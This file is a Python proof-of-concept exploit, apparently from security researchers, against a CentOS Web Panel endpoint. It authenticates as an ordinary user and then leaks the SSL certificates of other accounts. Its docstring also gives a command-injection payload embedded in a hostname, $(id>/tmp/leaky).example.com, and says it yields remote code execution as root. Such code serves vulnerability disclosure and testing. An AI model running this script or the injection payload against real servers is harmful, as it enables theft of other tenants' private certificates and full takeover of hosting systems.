# Copyright (C) 2022 Mat Rollings, Immersive Labs
# https://github.com/Immersive-Labs-Sec/
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import argparse
import base64

import requests
import urllib3

# Disable the Insecure Warnings for self signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",

}

session = requests.session()

"""
Leak SSL certificates from other accounts.

Note that this endpoint is also vulnerable to command injection
providing a hostname like $(id>/tmp/leaky).example.com will achieve RCE as root too.

- Requires a valid user login

[POST] index.php?module=letsencrypt&acc=infomodal
[DATA] domain=srv2.example.com&type=cert
"""


def login(base_url, username, password):
    login_url = f'{base_url}/login/index.php?acc=validate'
    account_url = f'{base_url}/{username}/'

    data = {
        'username': username,
        'password': base64.b64encode(password.encode('ascii')),
        'sessioning': '0',
        'userlang': ''
    }

    response = session.post(login_url, data=data, verify=False)
    token = response.json().get('token')

    if not token:
        return False

    data = {
        'username': username,
        'password': '',
        'token': token,
        'intended': ''
    }

    response = session.post(account_url,
                            data=data,
                            verify=False,
                            allow_redirects=False)

    # Check the User cookie was set and will exist in our session
    cookies = response.cookies.get_dict()
    for key in cookies.keys():
        if key.startswith('cwpsrv-User-'):
            return True


def leak_certificate(base_url, username, hostname):
    """Leak the SSL certificate for a given host"""

    target_url = f'{base_url}/{username}/index.php?module=letsencrypt&acc=infomodal'
    post_data = {
        'domain': hostname,
        'type': 'cert'
    }

    response = session.post(target_url, data=post_data, verify=False)

    if response.status_code == 200:
        j = response.json()
        return j.get('result')


if __name__ == '__main__':

    parser = argparse.ArgumentParser(
        description='Leak SSL certificates for a known hostname')
    parser.add_argument(
        '--target',
        help='Target Host e.g. 54.32.155.22',
        required=True)

    parser.add_argument(
        '--username',
        help='Username for an existing account',
        required=True)

    parser.add_argument(
        '--password',
        help="Password for existing account",
        required=True)

    parser.add_argument(
        '--hostname',
        help="The hostname to leak a certificate for e.g. test.exampledomain.com",
        required=True)

    parser.add_argument(
        '--proxy',
        help="Proxy Requests through a default local BURP instance",
        required=False,
        action='store_true')

    args = parser.parse_args()

    if args.proxy:
        session.proxies.update(proxies)

    # Construct our Base URL
    base_url = f'https://{args.target}:2083'

    print(f'[+] Logging in to target with username {args.username}')
    authenticated = login(base_url, args.username, args.password)

    if authenticated:
        print('  [-] Auth Successful')
        print(f'  [-] Attempting to leak certificate for {args.hostname}')
        response = leak_certificate(base_url, args.username, args.hostname)
        if 'BEGIN CERTIFICATE' in response:
            print('[*] Certificate leaked:')
            print(response)
        else:
            print('[!] The server returned an error')
            print(response)

    else:
        print(f'[!] Unable to authenticate with the target')
